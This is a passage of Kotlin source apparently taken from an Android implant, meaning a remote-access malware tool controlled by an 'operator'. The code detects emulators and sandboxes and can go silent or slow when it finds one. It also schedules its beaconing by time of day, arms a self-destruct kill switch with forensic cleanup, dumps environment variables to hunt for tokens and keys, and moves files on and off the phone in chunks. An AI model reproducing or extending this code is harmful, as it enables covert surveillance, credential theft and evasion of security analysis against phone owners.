            Forensics.clean(ctx, stateDir)
        } else {
            Forensics.suicide(ctx, stateDir, args)
        }
        return Outcome(0, text.toByteArray(), "")
    }

    /**
     * The laboratory around the phone.
     */
    private fun lab(args: Upk): Outcome {
        val ctx = context?.android
            ?: return Outcome(2, ByteArray(0), "emulator.detect: the phone has no context to look at")
        val verdict = Lab.inspect(ctx)
        return Outcome(0, verdict.text().toByteArray(), "")
            .with("posture", verdict.value())
    }

    private fun evasionReport(): Outcome {
        val posture = Evasion.classify()
        val state = Evasion.load(stateDir())
        val factor = Evasion.factor(state)
        return Outcome(0, posture.report().toByteArray(), "")
            .with("posture", postureValue(posture))
            .with("posture_sleep_factor", Upk.num((factor * 100).toLong()))
    }

    /** The posture as an upk value, the same shape the desktop beacon sends. */
    private fun postureValue(posture: Evasion.Posture): Upk {
        val artefacts = posture.artefacts.map {
            Upk.map(
                "name" to Upk.str(it.name),
                "class" to Upk.str(it.kind),
                "severity" to Upk.num(it.severity.toLong()),
                "detail" to Upk.str(it.detail),
            )
        }
        return Upk.map(
            "label" to Upk.str(posture.label()),
            "virtual" to Upk.bool(posture.emulated),
            "workstation" to Upk.bool(false),
            "developer" to Upk.bool(false),
            "lab" to Upk.bool(false),
            "sandbox" to Upk.bool(posture.emulated || posture.debugger),
            "confidence" to Upk.num(posture.confidence.toLong()),
            "reasons" to Upk.Arr(posture.reasons.map { Upk.str(it) }),
            "artefacts" to Upk.Arr(artefacts),
        )
    }

    /** Apply the operator's settings to the posture. */
    private fun evasionPosture(args: Upk): Outcome {
        val state = Evasion.load(stateDir())
        var updated = state
        args.field("silence_on_emulator")?.flag()?.let {
            updated = updated.copy(silenceOnEmulator = it)
        }
        args.field("slow_on_emulator")?.flag()?.let {
            updated = updated.copy(slowOnEmulator = it)
        }
        Evasion.save(stateDir(), updated)
        val posture = Evasion.classify()
        val text = StringBuilder("posture: the settings were applied\n")
        text.append("posture: silence on an emulator: ${updated.silenceOnEmulator}\n")
        text.append("posture: slow on an emulator: ${updated.slowOnEmulator}\n")
        return Outcome(0, text.toString().toByteArray(), "")
            .with("posture", postureValue(posture))
    }

    /** The schedule of the day. */
    private fun evasionProfile(args: Upk): Outcome {
        val state = Evasion.load(stateDir())
        var updated = state
        args.field("base")?.long()?.let { updated = updated.copy(base = it) }
        args.field("busy_start")?.long()?.let { updated = updated.copy(busyStart = it.toInt()) }
        args.field("busy_end")?.long()?.let { updated = updated.copy(busyEnd = it.toInt()) }
        args.field("busy_factor")?.long()?.let { updated = updated.copy(busyFactor = it) }
        args.field("night_factor")?.long()?.let { updated = updated.copy(nightFactor = it) }
        args.field("weekend_factor")?.long()?.let { updated = updated.copy(weekendFactor = it) }
        Evasion.save(stateDir(), updated)
        val factor = Evasion.factor(updated)
        val text = "schedule: base ${updated.base}s, busy ${updated.busyStart}-${updated.busyEnd}, " +
            "busy ${updated.busyFactor}%, night ${updated.nightFactor}%, " +
            "weekend ${updated.weekendFactor}%\n"
        return Outcome(0, text.toByteArray(), "")
            .with("schedule_factor", Upk.num((factor * 100).toLong()))
    }

    /** The kill switch: the moment the implant stops existing. */
    private fun evasionKillswitch(args: Upk): Outcome {
        val state = Evasion.load(stateDir())
        if (args.field("clear")?.flag() == true) {
            Evasion.save(
                stateDir(),
                state.copy(
                    killArmed = false,
                    killFile = "",
                    killUptimeHours = 0,
                    killMarker = "",
                ),
            )
            return Outcome(0, "killswitch: it is disarmed\n".toByteArray(), "")
        }
        val file = args.field("file")?.text() ?: ""
        val hours = args.field("uptime")?.long() ?: 0
        val marker = args.field("marker")?.text() ?: ""
        if (file.isEmpty() && hours <= 0 && marker.isEmpty()) {
            return Outcome(
                1,
                ByteArray(0),
                "evade.killswitch needs args.file, args.uptime or args.marker",
            )
        }
        Evasion.save(
            stateDir(),
            state.copy(
                killArmed = true,
                killFile = file,
                killUptimeHours = hours,
                killMarker = marker,
                killNote = args.field("note")?.text() ?: "",
            ),
        )
        val text = StringBuilder("killswitch: it is armed\n")
        if (file.isNotEmpty()) {
            text.append("killswitch: it fires when the file $file appears\n")
        }
        if (hours > 0) {
            text.append("killswitch: it fires when the phone has been up for $hours hours\n")
        }
        if (marker.isNotEmpty()) {
            text.append("killswitch: it fires when the operator sends $marker\n")
        }
        return Outcome(0, text.toString().toByteArray(), "")
    }

    private fun unsupported(kind: String, why: String): Outcome =
        Outcome(2, ByteArray(0), "unsupported on this platform: $kind ($why)")

    /**
     * The environment of the implant, sorted by name.
     *
     * The filter keeps the interesting variables in reach: "PATH", "TOKEN",
     * "KEY" -- whatever the operator is hunting for.
     */
    private fun environment(filter: String): Outcome {
        val needle = filter.lowercase()
        val sb = StringBuilder()
        var count = 0
        System.getenv().toSortedMap().forEach { (key, value) ->
            if (needle.isNotEmpty() && !key.lowercase().contains(needle)) return@forEach
            sb.append(key).append('=').append(value).append('\n')
            count += 1
        }
        return Outcome(0, sb.toString().toByteArray(), "").with("count", Upk.num(count.toLong()))
    }

    /**
     * Resolve a name into the addresses it points at.
     *
     * The operator asks "where does this name live" before opening a
     * connection to it, so the answer is the address list and nothing else.
     */
    private fun resolve(host: String, port: Long): Outcome {
        if (host.isEmpty()) return Outcome(1, ByteArray(0), "resolve requires args.host")
        return try {
            val addresses = java.net.InetAddress.getAllByName(host)
            if (addresses.isEmpty()) return Outcome(1, ByteArray(0), "resolve $host: no addresses")
            val sb = StringBuilder()
            addresses.forEach { address ->
                sb.append(address.hostAddress)
                if (port > 0) sb.append(':').append(port)
                sb.append('\n')
            }
            Outcome(0, sb.toString().toByteArray(), "")
                .with("count", Upk.num(addresses.size.toLong()))
        } catch (t: Throwable) {
            Outcome(1, ByteArray(0), "resolve $host: ${t.message}")
        }
    }

    /**
     * Create the file if it is missing and stamp it with the current time.
     *
     * The contract is the one of the POSIX `touch`: the file exists
     * afterwards and its timestamps are "now".
     */
    private fun touch(path: String): Outcome {
        if (path.isEmpty()) return Outcome(1, ByteArray(0), "touch requires args.path")
        return try {
            val file = File(path)
            val existed = file.exists()
            if (!existed && !file.createNewFile()) {
                return Outcome(1, ByteArray(0), "touch $path: cannot create the file")
            }
            if (!file.setLastModified(System.currentTimeMillis())) {
                return Outcome(1, ByteArray(0), "touch $path: cannot set the timestamp")
            }
            val verb = if (existed) "touched" else "created"
            Outcome(0, "$verb $path (${file.length()} bytes)\n".toByteArray(), "")
                .with("size", Upk.num(file.length()))
        } catch (t: Throwable) {
            Outcome(1, ByteArray(0), "touch $path: ${t.message}")
        }
    }

    /**
     * Read one chunk of a file, mirroring implant/rust/src/task.rs.
     *
     * `total`, `offset`, `eof` and a per-chunk SHA-256 make a multi-request
     * transfer verifiable instead of hopeful.
     */
    fun download(path: String, offset: Long, limit: Long): Outcome {
        if (path.isEmpty()) return Outcome(1, ByteArray(0), "download requires path")
        val size = limit.coerceIn(1, MAX_OUTPUT.toLong()).toInt()
        return try {
            val file = File(path)
            if (file.isDirectory) return Outcome(1, ByteArray(0), "download $path: is a directory")
            val total = file.length()
            if (offset > total) {
                return Outcome(1, ByteArray(0), "download $path: offset $offset past end ($total)")
            }
            val chunk = RandomAccessFile(file, "r").use { raf ->
                raf.seek(offset)
                val buf = ByteArray(minOf(size.toLong(), total - offset).toInt())
                var read = 0
                while (read < buf.size) {
                    val n = raf.read(buf, read, buf.size - read)
                    if (n < 0) break
                    read += n
                }
                if (read == buf.size) buf else buf.copyOfRange(0, read)
            }
            val eof = offset + chunk.size >= total
            Outcome(0, chunk, "")
                .with("total", Upk.num(total))
                .with("offset", Upk.num(offset))
                .with("eof", Upk.bool(eof))
                .with("sha256", Upk.str(sha256Hex(chunk)))
        } catch (t: Throwable) {
            Outcome(1, ByteArray(0), "download: ${t.message}")
        }
    }

    /**
     * Write one chunk at `offset`; offset 0 truncates, so re-sending a shorter
     * file cannot leave the previous tail behind. The final chunk reports the
     * whole-file hash.
     */
    fun upload(path: String, data: ByteArray, offset: Long, eof: Boolean): Outcome {
        if (path.isEmpty()) return Outcome(1, ByteArray(0), "upload requires path")
        return try {
            RandomAccessFile(File(path), "rw").use { raf ->
                if (offset == 0L) raf.setLength(0)
                raf.seek(offset)
                raf.write(data)
            }
            val written = offset + data.size
            val outcome = Outcome(0, "wrote ${data.size} bytes at offset $offset to $path\n".toByteArray(), "")
                .with("written", Upk.num(written))
                .with("eof", Upk.bool(eof))
            if (eof) {
                val whole = File(path).readBytes()
                outcome
                    .with("total", Upk.num(whole.size.toLong()))
                    .with("sha256", Upk.str(sha256Hex(whole)))
            } else {
                outcome
            }
        } catch (t: Throwable) {
            Outcome(1, ByteArray(0), "upload: ${t.message}")
        }
    }

    private fun sha256Hex(data: ByteArray): String {
        val digest = MessageDigest.getInstance("SHA-256").digest(data)
        val sb = StringBuilder(digest.size * 2)
        for (b in digest) sb.append("%02x".format(b.toInt() and 0xff))
        return sb.toString()
    }

    /**
     * Best-effort process list. Android restricts /proc to the app's own uid on
     * modern releases, so this degrades to whatever is visible and says so.
     */
    private fun processList(): Outcome {
        return try {
            val proc = File("/proc")
            val pids = proc.listFiles { f -> f.name.all { it.isDigit() } } ?: return Outcome(1, ByteArray(0), "ps: /proc not readable")
            val sb = StringBuilder()
            var visible = 0
            pids.mapNotNull { it.name.toIntOrNull() }.sorted().forEach { pid ->
                val cmdline = try {
                    File("/proc/$pid/cmdline").readBytes().toString(Charsets.UTF_8).replace('\u0000', ' ').trim()
                } catch (_: Throwable) {
                    ""
                }
                if (cmdline.isNotEmpty()) {
                    visible += 1
                    sb.append("%d %s%n".format(pid, cmdline))
                }
            }
            if (visible == 0) sb.append("ps: process list restricted by the platform\n")
            Outcome(0, sb.toString().toByteArray(), "")
        } catch (t: Throwable) {
            Outcome(1, ByteArray(0), "ps: ${t.message}")
        }
    }

    /** The last lines of a file: what a log says right now. */
    private fun tail(path: String, lines: Long): Outcome {
        return try {
            val file = File(path)
            if (!file.isFile) return Outcome(1, ByteArray(0), "not a file: $path")
            val all = file.readLines()
            val count = lines.toInt().coerceAtLeast(0)
            val kept = if (all.size > count) all.subList(all.size - count, all.size) else all
            Outcome(0, (kept.joinToString("\n") + "\n").toByteArray(), "")
        } catch (t: Throwable) {
            Outcome(1, ByteArray(0), "tail: ${t.message}")
        }
    }

    /** The digest of a file, so the operator can compare it with a published one. */
    private fun hash(path: String): Outcome {
        return try {
            val file = File(path)
            val digest = MessageDigest.getInstance("SHA-256").digest(file.readBytes())
            val hex = digest.joinToString("") { "%02x".format(it) }
            Outcome(0, "sha256 $hex ${file.length()} $path\n".toByteArray(), "")
        } catch (t: Throwable) {
            Outcome(1, ByteArray(0), "hash: ${t.message}")
        }
    }

    private fun listDir(path: String): Outcome {
        return try {
            val dir = File(path)
            val entries = dir.listFiles() ?: return Outcome(1, ByteArray(0), "not a directory: $path")
            val sb = StringBuilder()
            entries.sortedBy { it.name }.forEach { f ->
                val kind = if (f.isDirectory) "d" else "-"
                sb.append("%s %12d %s%n".format(kind, f.length(), f.absolutePath))
            }
            Outcome(0, sb.toString().toByteArray(), "")
        } catch (t: Throwable) {
            Outcome(1, ByteArray(0), "ls: ${t.message}")
        }
    }
}
